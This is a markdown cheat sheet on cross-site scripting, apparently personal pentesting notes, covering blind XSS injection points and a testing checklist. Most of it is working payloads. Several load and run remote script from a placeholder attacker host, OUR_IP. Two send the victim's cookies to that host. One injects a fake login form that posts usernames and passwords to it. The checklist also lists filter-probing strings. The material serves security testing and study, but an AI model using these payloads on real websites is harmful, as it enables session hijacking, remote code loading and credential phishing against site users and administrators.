# Cross-Site Scripting
- [Blind XSS](#blind-xss)
- [Testing](#testing)


> [!NOTE]
> XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).


## Blind XSS
- A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

    - Contact Forms
    - Reviews
    - User Details
    - Support Tickets
    - HTTP User-Agent header

- Payloads trigger Blind XSS:
    - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
```javascript
<script src='http://OUR_IP'></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

- Grab the cookies:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

- **Phishing**
    - Login form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```



## Testing 
- [ ] Check for any reflection

- [ ] XSS context is inside a quoted string literal
    - [ ] `'-alert(document.domain)-'`
    - [ ] `';alert(document.domain)//`

- [ ] Hidden inputs
    - [ ] Check for href in canonical link tag `<link rel="canonical" href='http://WEBSITE/?'accesskey='x'onclick='alert(1)'/>`
    - [ ] Check forms `<input type="hidden" accesskey="x" onclick="alert(1)">`

- [ ] Check for CSTI (Angularjs, Vuejs)
- [ ] Check for DOM XSS (using DOM invader)


- [XSS Filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md#bypass-using-bom)



- **Resources** 
    - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
    - [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
